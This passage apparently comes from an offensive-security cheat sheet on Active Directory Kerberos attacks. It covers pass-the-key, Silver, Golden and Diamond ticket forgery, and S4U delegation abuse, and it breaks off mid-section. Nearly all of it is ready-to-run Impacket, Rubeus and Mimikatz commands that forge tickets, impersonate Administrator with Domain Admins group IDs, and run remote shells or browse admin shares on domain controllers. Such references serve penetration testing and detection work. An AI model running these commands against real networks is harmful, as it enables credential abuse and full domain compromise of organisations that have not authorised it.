+<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>getTGT.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span><span class="w"> </span>-aesKey<span class="w"> </span><span class="nv">$AES256</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>klist
+</span></code></pre></div>
+<p>Use the ticket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>smbexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-k<span class="w"> </span>--use-kcache
+</span></code></pre></div>
+<p>Windows with Rubeus RC4/NT hash:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">alice</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">8846f7eaee8fb117ad06bdd830b7586c</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Windows with AES256:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">alice</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">aes256</span><span class="p">:</span><span class="n">0000000000000000000000000000000000000000000000000000000000000000</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Save ticket instead of injecting:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">alice</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">8846f7eaee8fb117ad06bdd830b7586c</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">alice_tgt</span><span class="p">.</span><span class="n">kirbi</span>
+</span></code></pre></div>
+<p>Mimikatz:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>mimikatz.exe
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>sekurlsa::pth /user:alice /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe
+</span></code></pre></div>
+<p>Then from the spawned process:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>klist
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>dir \\target.corp.local\c$
+</span></code></pre></div>
+<hr />
+<h2 id="silver-ticket">Silver Ticket</h2>
+<p>A Silver Ticket is a forged Kerberos service ticket.</p>
+<p>It is forged for a specific service SPN and encrypted with the target service account key. This means it is usually scoped to one service on one host or service account.</p>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Service account hash/key</td>
+<td>Key for the account owning the SPN.</td>
+</tr>
+<tr>
+<td>Domain SID</td>
+<td>Needed for PAC fields.</td>
+</tr>
+<tr>
+<td>Domain name</td>
+<td>Kerberos realm context.</td>
+</tr>
+<tr>
+<td>Target SPN</td>
+<td>Example: <code>cifs/filesrv01.corp.local</code>.</td>
+</tr>
+<tr>
+<td>Username/RID/group IDs</td>
+<td>PAC identity fields.</td>
+</tr>
+</tbody>
+</table>
+<p>Common SPNs:</p>
+<table>
+<thead>
+<tr>
+<th>SPN</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cifs/host</code></td>
+<td>SMB file/admin shares.</td>
+</tr>
+<tr>
+<td><code>host/host</code></td>
+<td>Generic host services.</td>
+</tr>
+<tr>
+<td><code>http/host</code></td>
+<td>Web service.</td>
+</tr>
+<tr>
+<td><code>mssqlsvc/host:1433</code></td>
+<td>MSSQL.</td>
+</tr>
+<tr>
+<td><code>ldap/dc</code></td>
+<td>LDAP.</td>
+</tr>
+<tr>
+<td><code>wsman/host</code></td>
+<td>WinRM.</td>
+</tr>
+</tbody>
+</table>
+<p>Linux with Impacket <code>ticketer.py</code>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>ticketer.py<span class="w"> </span>-nthash<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-domain-sid<span class="w"> </span><span class="nv">$DOMAIN_SID</span><span class="w"> </span>-domain<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-spn<span class="w"> </span>cifs/<span class="nv">$TARGET</span><span class="w"> </span>Administrator
+</span></code></pre></div>
+<p>Use created ccache:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>klist
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>smbclient.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>For MSSQL:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>ticketer.py<span class="w"> </span>-nthash<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-domain-sid<span class="w"> </span><span class="nv">$DOMAIN_SID</span><span class="w"> </span>-domain<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-spn<span class="w"> </span>MSSQLSvc/sql01.corp.local:1433<span class="w"> </span>Administrator
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>mssqlclient.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@sql01.corp.local
+</span></code></pre></div>
+<p>Windows with Rubeus:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">silver</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">8846f7eaee8fb117ad06bdd830b7586c</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">filesrv01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ldap</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Explicit values:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">silver</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">8846f7eaee8fb117ad06bdd830b7586c</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">filesrv01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1111111111</span><span class="p">-</span><span class="n">2222222222</span><span class="p">-</span><span class="n">3333333333</span> <span class="p">/</span><span class="n">id</span><span class="p">:</span><span class="n">500</span> <span class="p">/</span><span class="n">groups</span><span class="p">:</span><span class="n">512</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Mimikatz:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>mimikatz.exe
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>kerberos::golden /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /target:filesrv01.corp.local /service:cifs /rc4:8846f7eaee8fb117ad06bdd830b7586c /user:Administrator /ptt
+</span></code></pre></div>
+<p>Validate:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>klist
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>dir \\filesrv01.corp.local\c$
+</span></code></pre></div>
+<p>Linux validate:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>smbclient.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<hr />
+<h2 id="golden-ticket">Golden Ticket</h2>
+<p>A Golden Ticket is a forged Kerberos TGT.</p>
+<p>It is created using the <code>krbtgt</code> account key. Because the TGT is trusted by the domain, this is a domain-compromise-level technique.</p>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>krbtgt hash/key</td>
+<td>NT hash or AES key of krbtgt account.</td>
+</tr>
+<tr>
+<td>Domain SID</td>
+<td>Required for forged PAC.</td>
+</tr>
+<tr>
+<td>Domain name</td>
+<td>Kerberos realm.</td>
+</tr>
+<tr>
+<td>Target username</td>
+<td>Can be existing or forged identity.</td>
+</tr>
+<tr>
+<td>Group RIDs</td>
+<td>Commonly includes <code>512</code> for Domain Admins.</td>
+</tr>
+</tbody>
+</table>
+<p>Common group RIDs:</p>
+<table>
+<thead>
+<tr>
+<th>RID</th>
+<th>Group</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>512</code></td>
+<td>Domain Admins</td>
+</tr>
+<tr>
+<td><code>513</code></td>
+<td>Domain Users</td>
+</tr>
+<tr>
+<td><code>518</code></td>
+<td>Schema Admins</td>
+</tr>
+<tr>
+<td><code>519</code></td>
+<td>Enterprise Admins</td>
+</tr>
+<tr>
+<td><code>520</code></td>
+<td>Group Policy Creator Owners</td>
+</tr>
+</tbody>
+</table>
+<p>Linux with Impacket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>ticketer.py<span class="w"> </span>-nthash<span class="w"> </span>KRBTGT_NT_HASH<span class="w"> </span>-domain-sid<span class="w"> </span><span class="nv">$DOMAIN_SID</span><span class="w"> </span>-domain<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>Administrator
+</span></code></pre></div>
+<p>With groups:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>ticketer.py<span class="w"> </span>-nthash<span class="w"> </span>KRBTGT_NT_HASH<span class="w"> </span>-domain-sid<span class="w"> </span><span class="nv">$DOMAIN_SID</span><span class="w"> </span>-domain<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-groups<span class="w"> </span><span class="m">512</span>,513,518,519,520<span class="w"> </span>Administrator
+</span></code></pre></div>
+<p>With AES:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>ticketer.py<span class="w"> </span>-aesKey<span class="w"> </span>KRBTGT_AES_KEY<span class="w"> </span>-domain-sid<span class="w"> </span><span class="nv">$DOMAIN_SID</span><span class="w"> </span>-domain<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>Administrator
+</span></code></pre></div>
+<p>Use ticket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>klist
+</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$TARGET</span>
+</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a>psexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>Windows with Rubeus and LDAP-assisted PAC fields:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">golden</span> <span class="p">/</span><span class="n">aes256</span><span class="p">:</span><span class="n">KRBTGT_AES256_KEY</span> <span class="p">/</span><span class="n">ldap</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Explicit Rubeus:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">golden</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">KRBTGT_NT_HASH</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1111111111</span><span class="p">-</span><span class="n">2222222222</span><span class="p">-</span><span class="n">3333333333</span> <span class="p">/</span><span class="n">id</span><span class="p">:</span><span class="n">500</span> <span class="p">/</span><span class="n">groups</span><span class="p">:</span><span class="n">512</span><span class="p">,</span><span class="n">513</span><span class="p">,</span><span class="n">518</span><span class="p">,</span><span class="n">519</span><span class="p">,</span><span class="n">520</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Mimikatz:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>mimikatz.exe
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:KRBTGT_NT_HASH /id:500 /groups:512,513,518,519,520 /ptt
+</span></code></pre></div>
+<p>Export instead of injecting:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:KRBTGT_NT_HASH /id:500 /groups:512 /ticket:golden.kirbi
+</span></code></pre></div>
+<p>Validate:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>klist
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>dir \\dc01.corp.local\c$
+</span></code></pre></div>
+<p>Linux:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>psexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$DC_HOST</span>
+</span></code></pre></div>
+<hr />
+<h2 id="diamond-ticket">Diamond Ticket</h2>
+<p>A Diamond Ticket modifies a real TGT instead of creating a completely synthetic TGT from scratch.</p>
+<p>The general idea is:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>Obtain a legitimate TGT
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>Decrypt or modify PAC using krbtgt key
+</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>Re-sign and re-encrypt the ticket
+</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>Use the resulting modified TGT
+</span></code></pre></div>
+<p>It requires high-value key material such as the <code>krbtgt</code> key, but starts from a real TGT request.</p>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Valid way to obtain TGT</td>
+<td>Password, hash, AES key, certificate, or tgtdeleg trick.</td>
+</tr>
+<tr>
+<td>krbtgt key</td>
+<td>Used to decrypt/sign/re-encrypt modified TGT.</td>
+</tr>
+<tr>
+<td>Domain context</td>
+<td>Domain, DC, SID, target user fields.</td>
+</tr>
+<tr>
+<td>Rubeus</td>
+<td>Common Windows tool for this technique.</td>
+</tr>
+</tbody>
+</table>
+<p>Rubeus with username and password:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">diamond</span> <span class="p">/</span><span class="n">krbkey</span><span class="p">:</span><span class="n">KRBTGT_AES256_KEY</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">alice</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">Password123</span><span class="p">!</span> <span class="p">/</span><span class="n">enctype</span><span class="p">:</span><span class="n">aes</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ticketuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">ticketuserid</span><span class="p">:</span><span class="n">500</span> <span class="p">/</span><span class="n">groups</span><span class="p">:</span><span class="n">512</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Rubeus with RC4 user key:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">diamond</span> <span class="p">/</span><span class="n">krbkey</span><span class="p">:</span><span class="n">KRBTGT_AES256_KEY</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">alice</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">USER_NT_HASH</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ticketuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">ticketuserid</span><span class="p">:</span><span class="n">500</span> <span class="p">/</span><span class="n">groups</span><span class="p">:</span><span class="n">512</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Rubeus with AES user key:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">diamond</span> <span class="p">/</span><span class="n">krbkey</span><span class="p">:</span><span class="n">KRBTGT_AES256_KEY</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">alice</span> <span class="p">/</span><span class="n">aes256</span><span class="p">:</span><span class="n">USER_AES256_KEY</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ticketuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">ticketuserid</span><span class="p">:</span><span class="n">500</span> <span class="p">/</span><span class="n">groups</span><span class="p">:</span><span class="n">512</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Using tgtdeleg trick:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">diamond</span> <span class="p">/</span><span class="n">krbkey</span><span class="p">:</span><span class="n">KRBTGT_AES256_KEY</span> <span class="p">/</span><span class="n">tgtdeleg</span> <span class="p">/</span><span class="n">ticketuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">ticketuserid</span><span class="p">:</span><span class="n">500</span> <span class="p">/</span><span class="n">groups</span><span class="p">:</span><span class="n">512</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Save ticket:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">diamond</span> <span class="p">/</span><span class="n">krbkey</span><span class="p">:</span><span class="n">KRBTGT_AES256_KEY</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">alice</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">Password123</span><span class="p">!</span> <span class="p">/</span><span class="n">enctype</span><span class="p">:</span><span class="n">aes</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ticketuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">ticketuserid</span><span class="p">:</span><span class="n">500</span> <span class="p">/</span><span class="n">groups</span><span class="p">:</span><span class="n">512</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">diamond</span><span class="p">.</span><span class="n">kirbi</span>
+</span></code></pre></div>
+<p>Validate:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>klist
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>dir \\dc01.corp.local\c$
+</span></code></pre></div>
+<hr />
+<h2 id="s4u2self-s4u2proxy">S4U2Self S4U2Proxy</h2>
+<p>S4U is a Kerberos extension used in delegation scenarios.</p>
+<p>S4U2Self allows a service to obtain a service ticket to itself on behalf of a user.</p>
+<p>S4U2Proxy allows that service to use the S4U2Self ticket to obtain a service ticket to another service, if delegation is allowed.</p>
+<p>Common use in attacks:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>Controlled service account
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>  -&gt; S4U2Self to impersonate target user to self
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>  -&gt; S4U2Proxy to target service
+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a>  -&gt; service ticket for target SPN
+</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a>  -&gt; Pass the Ticket
+</span></code></pre></div>
+<p>Requirements depend on the delegation type:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Controlled service account</td>
+<td>User or computer account.</td>
+</tr>
+<tr>
+<td>SPN</td>
+<td>Usually required for classic constrained delegation.</td>
+</tr>
+<tr>
+<td>Delegation rights</td>
+<td><code>msDS-AllowedToDelegateTo</code> or RBCD.</td>
+</tr>
+<tr>
+<td>Target SPN</td>
+<td>Example: <code>cifs/server.corp.local</code>.</td>
+</tr>
+<tr>
+<td>Impersonated user</td>
+<td>User to impersonate.</td>
+</tr>
+</tbody>
+</table>
+<p>Impacket constrained delegation:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/<span class="nv">$TARGET</span><span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>With hash:</p>
